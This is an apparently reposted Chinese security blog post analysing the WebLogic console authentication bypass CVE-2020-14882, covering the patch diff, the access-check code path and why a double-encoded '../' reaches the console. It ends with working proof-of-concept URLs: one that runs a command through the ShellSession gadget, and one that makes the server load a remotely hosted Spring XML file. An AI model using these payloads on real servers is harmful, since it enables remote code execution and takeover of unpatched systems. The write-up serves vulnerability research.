\> 本文由 \[简悦 SimpRead\](http://ksria.com/simpread/) 转码， 原文地址 \[mp.weixin.qq.com\](https://mp.weixin.qq.com/s/\_zNr5Jw7tH\_6XlUdudhMhA)

简介
--

weblogic 管理控制台需要用户名和密码去登录，但是通过该漏洞，可以绕过登录校验，直接进入后台访问 weblogic 的各种资源。

补丁 diff
-------

在这里我的 weblogic 版本为 12.2.1.4，其他版本都大同小异。下面我们看一下补丁 diff 结果

![](https://mmbiz.qpic.cn/mmbiz_png/cOCqjucntdEvXXg0tRpIia0I3kliaKlfojaex7lGgSfApqjtKZnKBmL0V8mtERJ5VEKqnFAzw9QcNSxyjOuGpfbQ/640?wx_fmt=png)

因为这个类是 weblogic 从 http 访问的处理类，直接禁止 url 是否包含危险字符，如果包含，则直接退出。修复方案简单粗暴，不得不佩服。危险字符主要有以下几个

```
private static final String\[\] IllegalUrl = new String\[\]{";", "%252E%252E", "%2E%2E", "..", "%3C", "%3E", "<", ">"};
```

weblogic 管理控制台权限控制分析
--------------------

要分析这个洞，首先我们需要了解一下，登录 weblogic 管理控制台的权限控制

在处理 url 的`weblogic.servlet.internal.WebAppServletContext#doSecuredExecute方法`中，调用如下的代码去判断权限等一切有关于安全的内容。代码如下

```
if (context.getSecurityManager().checkAccess(req, rsp, applyAuthFilters, false)) {                if (s != null) {                    int count = ((SessionSecurityData)s).getConcurrentRequestCount();                    if (maxConcurrentRequestsAllowed != -1 && count > maxConcurrentRequestsAllowed) {                        context.logError("Rejecting request since concurrent requests allowable limit exceeded :" + maxConcurrentRequestsAllowed);                        rsp.sendError(500);                        return;                    }                }
```

在`weblogic.servlet.security.internal.WebAppSecurity#checkAccess(HttpServletRequest, HttpServletResponse, boolean, boolean, boolean)`中，判断是否所有 url 都需要权限。当然，访问静态资源肯定是不需要登陆的，可能是为了浏览器兼容性考虑，因为大部分浏览器在登陆后，对访问静态资源都会添加 cookie 头，只有个别浏览器不会。

所以 weblogic 将会根据访问的 url，也就是是否为静态资源，去返回一个`ResourceConstraint`对象。该对象描述了该 url 访问的资源的详细权限信息

```
            ResourceConstraint resourceConstraint = checkAllResources ? Holder.ALL\_CONSTRAINT : this.getConstraint(request);

authorized = this.delegateModule.isAuthorized(request, response, resourceConstraint, 
applyAuthFilters)
```

然后调用`weblogic.servlet.security.internal.SecurityModule#isAuthorized`方法，在该方法中获取用户 session，调用`weblogic.servlet.security.internal.ChainedSecurityModule#checkAccess`方法做进一步权限校验。

最后会在 weblogic.servlet.security.internal.CertSecurityModule#checkUserPerm 中调用 weblogic.servlet.security.internal.WebAppSecurity#hasPermission 方法，根据最开始生成的`ResourceConstraint`对象，判断该次 http 请求是否有权限。如图所示![](https://mmbiz.qpic.cn/mmbiz_png/cOCqjucntdEvXXg0tRpIia0I3kliaKlfojh6UnRv3TJeMW5RIAiaT85aXqnK8R3458sewATXrCAVBrY6hUO15UvHQ/640?wx_fmt=png)

如果用户访问的是静态资源，则返回 unrestricted 的值，hasPermission 返回为 true，weblogic 认为你有权限访问，于是就会放行。如果你访问非静态权限，则直接拦截你的请求，重定向至登陆页。

于是绕过登录的关键在于，怎么访问正常的资源，但是 weblogic 返回的是静态资源的`ResourceConstraint`对象

权限绕过分析
------

我们回到最开始的

```
ResourceConstraint resourceConstraint = checkAllResources ? Holder.ALL\_CONSTRAINT : this.getConstraint(request)
```

跟入`weblogic.servlet.security.internal.WebAppSecurityWLS#getConstraint(java.lang.String, java.lang.String)`

```
ResourceConstraint rcForAllMethods = consForAllMethods == null ? null : 
(ResourceConstraint)consForAllMethods.get(relURI);
```

在这里会调用`weblogic.servlet.utils.StandardURLMapping#get`去根据 url，返回对应的`ResourceConstraint`对象。

```
public Object get(String path) {        path = path.length() == 0 ? "/" : this.cased(path);        Object value = null;        if ((value = this.getExactOrPathMatch(path)) != null) {            return value;        } else {            return (value = this.getExtensionMatch(path)) != null ? value : this.getDefault();        }    }
```

首先调用`getExactOrPathMatch`方法，也就是根据 url，匹配是否在静态资源列表中，![](https://mmbiz.qpic.cn/mmbiz_png/cOCqjucntdEvXXg0tRpIia0I3kliaKlfojXXcFLL1ibma7U0tdajTqV53Huibbe9ibayRfNqxQnUMC1PBAH4VY5dINg/640?wx_fmt=png)

而 `%252E%252E%252F` 恰好是../ 的 url 二次编码结果。这样既可以返回静态资源的`ResourceConstraint`对象，又不会影响正常访问。

weblogic 二次编码原因
---------------

在 poc 中我们可以看到，`../`被二次编码了。下面我们来分析一下 weblogic 能解开的原因

根据 http 规定，url 部分，需要 url 编码后发送给服务器。服务器正常解开并继续处理。这是第一层 url 编码

第二层编码的处理，在`com.bea.netuix.servlets.manager.UIServletInternal#getTree`中，

```
    public static UIControl getTree(String requestPattern, UIContext ctxt, boolean setContentType, ResolvedLocale resolvedLocale) throws IOException, ServletException {
        HttpServletRequest request = ctxt.getServletRequest();
        HttpServletResponse response = ctxt.getServletResponse();
        requestPattern = URLDecoder.decode(requestPattern, containerServices.getWebappServices().getServerDefaultEncoding());
```

其中`URLDecoder.decode`会对第一次编码后的 url 做第二次解码的工作，当然，如果 url 还存在 url 编码的话。

这也就是为什么两次编码可以绕过的原因。

一次 url 编码为什么不可以绕过？因为经过服务器一次解码后，在`weblogic.servlet.utils.StandardURLMapping#get`处，无法匹配到静态资源。会被还原成原本的 url，所以无法绕过。。大家有机会可以看一下`weblogic.utils.collections.MatchMap#match`关于查找的代码

POC
---

#### weblogic 12

```
http://127.0.0.1:7001/console/css/%2e%2e%2fconsole.portal?\_nfpb=true&\_pageLabel=HomePage1&handle=com.tangosol.coherence.mvel2.sh.ShellSession(%22java.lang.Runtime.getRuntime().exec(%27calc.exe%27);%22);
```

因为`com.tangosol.coherence.mvel2.sh.ShellSession`这个 gadget，只存在于 weblogic 12，weblogic10 并没有这个 gadget（没有包），所以无法使用

#### weblogic 10

因为 weblogic 10 没有相关 gadget 所以会报错，如图![](https://mmbiz.qpic.cn/mmbiz_png/cOCqjucntdEvXXg0tRpIia0I3kliaKlfojA6bSFFMa7pXBgQP5nANJgT5749dwPEmK9cnGxWPicIibUDic3Pnw1HluQ/640?wx_fmt=png)

需要使用`com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext`

poc 如下

```
http://127.0.0.1:7001/console/css/%2e%2e%2fconsole.portal?\_nfpb=true&\_pageLabel=HomePage1&handle=com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext("http://192.168.184.1:8000/spel.xml")
```

参考
--

1.  https://testbnull.medium.com/weblogic-rce-by-only-one-get-request-cve-2020-14882-analysis-6e4b09981dbf
    

宽字节安全 发起了一个读者讨论 cve-2020-14882 weblogic 绕过登录分析 精选讨论内容

余下 1 条讨论内容